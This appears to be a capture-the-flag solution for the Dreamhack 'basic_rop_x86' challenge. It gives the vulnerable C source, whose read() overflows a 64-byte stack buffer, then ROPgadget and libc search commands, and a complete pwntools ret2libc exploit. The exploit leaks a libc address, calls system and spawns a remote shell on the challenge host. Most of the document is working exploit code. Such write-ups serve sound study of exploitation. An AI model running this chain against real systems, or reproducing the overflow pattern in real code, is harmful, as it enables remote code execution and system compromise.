```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```
---
find gadget vector

pop ret gadget
```c
ROPgadget --binary basic_rop_x86 --only "pop|ret"
```

pop pop ret gadget
```c
ROPgadget --binary basic_rop_x86 --only "pop pop ret"
```

pop pop pop ret gadget
```c
ROPgadget --binary basic_rop_x86 --only "pop pop pop ret"
```

more than 3 pop gadget
```c
ROPgadget --binary basic_rop_x86 | grep -E "pop .* pop .* pop .* ret"
```

---
find "/bin/sh"
```c
strings -a -t x ./libc.so.6 | grep "/bin/sh"
```

in terminal
```c
from pwn import *

# 1. 라이브러리 파일 로드
libc = ELF("./libc.so.6")

# 2. "/bin/sh" 문자열 탐색 및 오프셋 추출
binsh_offset = next(libc.search(b"/bin/sh"))

print("binsh offset:", hex(binsh_offset))

# 3. 익스플로잇 코드 작성 시 실제 주소 계산 예시
# binsh_address = libc_base + binsh_offset

```
in pwntools

```c
pwndbg> search "/bin/sh"
```
in pwndbg

```c
gdb> find &system, +9999999, "/bin/sh"
```
in gdb

---
ldd libc.so.6 check
```c
student@ubuntu:~/dreamhack/basic_rop_x86$ ldd basic_rop_x86
	linux-gate.so.1 (0xf7fb7000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dab000)
	/lib/ld-linux.so.2 (0xf7fb9000)
```
---

no pie -> code ROP

---
```c
from pwn import *
import time

#p = process("./basic_rop_x86")
p = remote("host3.dreamhack.games",20536)
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")

puts_plt = e.plt["puts"]
puts_got = e.got["puts"]
read_plt = e.plt["read"]
read_got = e.got["read"]
main = e.symbols["main"]
system = libc.symbols["system"]
pr = 0x0804868b
pppr = 0x08048689

#bss area
bss = 0x804a000 + 0x100
#bss = e.bss()

payload = b"A"*0x44
payload += b"B"*4
payload += p32(puts_plt)
payload += p32(pr)
payload += p32(puts_got)
payload += p32(main)

p.sendline(payload)
p.recvuntil(b"A"*0x40)
puts_st = u32(p.recv(4))
print(hex(puts_st))

libc_base = puts_st - libc.symbols["puts"]
system += libc_base

payload2 = b"A"*0x44
payload2 += b"B"*4
payload2 += p32(read_plt)
payload2 += p32(pppr)
payload2 += p32(0)
payload2 += p32(bss)
payload2 += p32(8)

payload2 += p32(system)
payload2 += b"AAAA"
payload2 += p32(bss)

p.sendline(payload2)
p.recvuntil(b"A"*0x40)
sleep(1)
p.send(b"/bin/sh\x00")

p.interactive()
```
